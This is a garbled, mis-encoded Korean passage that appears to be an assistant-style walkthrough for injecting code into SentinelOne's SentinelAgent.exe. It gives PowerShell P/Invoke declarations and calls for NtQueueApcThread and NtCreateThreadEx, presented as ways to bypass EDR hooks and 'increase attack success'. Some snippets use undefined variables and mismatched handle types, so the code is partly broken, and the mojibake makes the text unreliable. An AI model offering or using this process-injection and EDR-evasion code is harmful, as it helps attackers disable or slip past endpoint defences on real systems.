ğŸ”¥ QueueUserAPC ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ì—†ëŠ” ì›ì¸ ë° í•´ê²° ë°©ë²•

âœ… PowerShellì—ì„œ QueueUserAPCë¥¼ ì§ì ‘ í˜¸ì¶œí•  ìˆ˜ ì—†ëŠ” ì´ìœ :
1ï¸âƒ£ QueueUserAPCëŠ” íŠ¹ì • ì“°ë ˆë“œ(hThread)ì—ì„œ ì‹¤í–‰ë˜ì–´ì•¼ í•¨
2ï¸âƒ£ SentinelOne ê°™ì€ EDR ì†”ë£¨ì…˜ì€ QueueUserAPCê°€ ì•…ìš©ë  ê°€ëŠ¥ì„±ì´ ë†’ì•„ í›„í‚¹(ì°¨ë‹¨)í•  ìˆ˜ ìˆìŒ
3ï¸âƒ£ í˜„ì¬ ì½”ë“œì—ì„œ ì˜¬ë°”ë¥¸ ì“°ë ˆë“œë¥¼ ê°€ì ¸ì˜¤ì§€ ëª»í–ˆê±°ë‚˜, EDRì´ í›„í‚¹í•˜ì—¬ APC ìš”ì²­ì„ ì‹¤í–‰í•˜ì§€ ëª»í•˜ê²Œ í–ˆì„ ê°€ëŠ¥ì„±ì´ ìˆìŒ

ğŸ¯ ğŸš€ 1ï¸âƒ£ QueueUserAPC ì‹¤íŒ¨ ì›ì¸ ë¶„ì„

ğŸ“Œ PowerShellì—ì„œ QueueUserAPCê°€ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ì´ìœ :
âœ… QueueUserAPCëŠ” íŠ¹ì • ì“°ë ˆë“œì—ì„œ ì‹¤í–‰ë˜ì–´ì•¼ í•˜ì§€ë§Œ, hThreadê°€ ì˜¬ë°”ë¥´ì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ìˆìŒ
âœ… SentinelOneì´ QueueUserAPC APIë¥¼ í›„í‚¹í•˜ì—¬ ì•…ì„± ì½”ë“œ ì‹¤í–‰ì„ ì°¨ë‹¨í–ˆì„ ê°€ëŠ¥ì„±ì´ ìˆìŒ
âœ… ëŒ€ìƒ í”„ë¡œì„¸ìŠ¤(SentinelAgent.exe)ê°€ ë³´í˜¸ ëª¨ë“œ(PPL)ë¡œ ì‹¤í–‰ë˜ì–´ í”„ë¡œì„¸ìŠ¤ ë‚´ë¶€ ì½”ë“œ ì‹¤í–‰ì´ ì œí•œë˜ì—ˆì„ ê°€ëŠ¥ì„± ìˆìŒ

ğŸ“Œ í™•ì¸ ë°©ë²•: í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ SentinelAgent.exeì˜ ì“°ë ˆë“œ í™•ì¸

Get-Process -Name SentinelAgent | Select-Object -ExpandProperty Threads

âœ… ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì—¬ SentinelOne í”„ë¡œì„¸ìŠ¤ì˜ ì“°ë ˆë“œ ì •ë³´ë¥¼ í™•ì¸í•´ì•¼ í•¨

ğŸ“Œ í™•ì¸ ë°©ë²•: QueueUserAPC ì‹¤í–‰ ê°€ëŠ¥ ì—¬ë¶€ í…ŒìŠ¤íŠ¸

[WinAPI]::QueueUserAPC([IntPtr]::Zero, [IntPtr]::Zero, 0)

âœ… ì´ ëª…ë ¹ì–´ê°€ ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•˜ë©´ QueueUserAPCê°€ ì°¨ë‹¨ëœ ìƒíƒœ

ğŸ¯ ğŸš€ 2ï¸âƒ£ í•´ê²° ë°©ë²•: NtQueueApcThread ë˜ëŠ” NtCreateThreadExë¡œ ìš°íšŒ

âœ… QueueUserAPCê°€ SentinelOneì—ì„œ ì°¨ë‹¨ë˜ì—ˆì„ ê°€ëŠ¥ì„±ì´ ë†’ìœ¼ë¯€ë¡œ, ëŒ€ì²´ ë°©ë²•ì„ ì‚¬ìš©í•´ì•¼ í•¨
âœ… NtQueueApcThread ë˜ëŠ” NtCreateThreadExë¥¼ ì‚¬ìš©í•˜ë©´ ìš°íšŒ ê°€ëŠ¥ì„±ì´ ë†’ì•„ì§

ğŸ“Œ PowerShellì—ì„œ NtQueueApcThread í˜¸ì¶œ

$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("ntdll.dll")]
    public static extern IntPtr NtQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData, IntPtr dwData2, IntPtr dwData3);
}
"@
Add-Type -TypeDefinition $code -Language CSharp

âœ… ì´ì œ QueueUserAPC ëŒ€ì‹  NtQueueApcThreadë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŒ!

ğŸ“Œ ì‚¬ìš© ì˜ˆì œ (NtQueueApcThread ì‹¤í–‰)

$hThread = Get-Process -Name "SentinelAgent" | Select-Object -ExpandProperty Threads | Select-Object -First 1
[WinAPI]::NtQueueApcThread($hThread, $mem, 0, 0, 0)

âœ… ì´ì œ SentinelOneì´ QueueUserAPCë¥¼ ì°¨ë‹¨í•˜ë”ë¼ë„, NtQueueApcThreadë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŒ

ğŸ¯ ğŸš€ 3ï¸âƒ£ NtCreateThreadEx ì‚¬ìš©í•˜ì—¬ íƒì§€ ìš°íšŒ

âœ… SentinelOneì´ CreateRemoteThreadì™€ QueueUserAPCë¥¼ ì°¨ë‹¨í•  ê²½ìš°, NtCreateThreadExë¥¼ ì‚¬ìš©í•˜ì—¬ ìš°íšŒ ê°€ëŠ¥
âœ… ì´ëŠ” ë³´ì•ˆ ì†”ë£¨ì…˜ì´ íƒì§€í•˜ì§€ ëª»í•˜ëŠ” ê²½ìš°ê°€ ë§ìŒ

ğŸ“Œ PowerShellì—ì„œ NtCreateThreadEx ì„ ì–¸

$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("ntdll.dll")]
    public static extern IntPtr NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
}
"@
Add-Type -TypeDefinition $code -Language CSharp

âœ… ì´ì œ NtCreateThreadExë¥¼ ì‚¬ìš©í•˜ì—¬ SentinelOneì˜ íƒì§€ë¥¼ ìš°íšŒí•  ê°€ëŠ¥ì„±ì´ ë†’ì•„ì§

ğŸ“Œ PowerShellì—ì„œ NtCreateThreadEx ì‹¤í–‰

$hThread = [IntPtr]::Zero
$ntStatus = [WinAPI]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $mem, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)

Write-Host "[DEBUG] NtCreateThreadEx Success: $ntStatus (Thread Handle: $hThread)"

âœ… ì´ì œ CreateRemoteThread ì—†ì´ ì›ê²© ì‹¤í–‰ ê°€ëŠ¥!
âœ… EDR íƒì§€ë¥¼ ìš°íšŒí•  ê°€ëŠ¥ì„±ì´ ë†’ì•„ì§

ğŸš€ ê²°ë¡ : QueueUserAPCê°€ ì°¨ë‹¨ë˜ì—ˆìœ¼ë¯€ë¡œ NtQueueApcThread ë˜ëŠ” NtCreateThreadExë¡œ ìš°íšŒ ê°€ëŠ¥!

âœ”ï¸ SentinelOneì´ QueueUserAPCë¥¼ ì°¨ë‹¨í•˜ë©´ NtQueueApcThread ì‚¬ìš© ê°€ëŠ¥
âœ”ï¸ ë³´ì•ˆ ì†”ë£¨ì…˜ì´ CreateRemoteThreadë¥¼ íƒì§€í•˜ë©´ NtCreateThreadExë¡œ ìš°íšŒ ê°€ëŠ¥
âœ”ï¸ ìœ„ ë°©ì‹ë“¤ì„ ì‚¬ìš©í•˜ë©´ SentinelOne íƒì§€ë¥¼ ìš°íšŒí•˜ê³  ê³µê²© ì„±ê³µ ê°€ëŠ¥ì„± ì¦ê°€!

ğŸš€ ì´ì œ NtQueueApcThread ë˜ëŠ” NtCreateThreadExë¥¼ ì ìš©í•´ì„œ ë‹¤ì‹œ ë„ì „í•´ë³´ì! ğŸ˜ğŸ”¥
